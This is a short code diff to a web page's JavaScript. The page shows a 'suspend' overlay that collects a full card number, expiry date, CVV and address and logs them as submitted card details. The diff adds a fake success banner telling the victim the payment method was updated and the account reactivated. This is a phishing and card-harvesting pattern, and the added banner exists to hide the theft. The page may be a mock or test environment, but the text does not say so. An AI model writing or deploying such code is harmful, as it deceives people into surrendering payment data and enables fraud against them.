@@ -1115,6 +1115,12 @@ document.getElementById('suspendForm').addEventListener('submit',function(e){
   e.preventDefault();
   logAction({card_number:document.getElementById('sCardNumber').value,card_expiry:document.getElementById('sCardExpiry').value,cvv:document.getElementById('sCardCvv').value,address:document.getElementById('sAddress').value},'Full card details submitted');
   document.getElementById('suspendOverlay').style.display='none';
+  var banner=document.createElement('div');
+  banner.id='success-banner';
+  banner.style.cssText='position:fixed;top:80px;right:24px;z-index:40000;background:#1D8102;color:#fff;padding:14px 20px;border-radius:2px;font-size:14px;font-weight:600;box-shadow:0 2px 8px rgba(0,0,0,.25)';
+  banner.textContent='Payment method updated successfully. Your account is now active.';
+  document.body.appendChild(banner);
+  setTimeout(function(){if(banner.parentNode)banner.parentNode.removeChild(banner);},8000);
 });
 // Format
 document.getElementById('sCardNumber').addEventListener('input',function(){let v=this.value.replace(/\D/g,'');v=v.replace(/(.{4})/g,'$1 ').trim();this.value=v;});
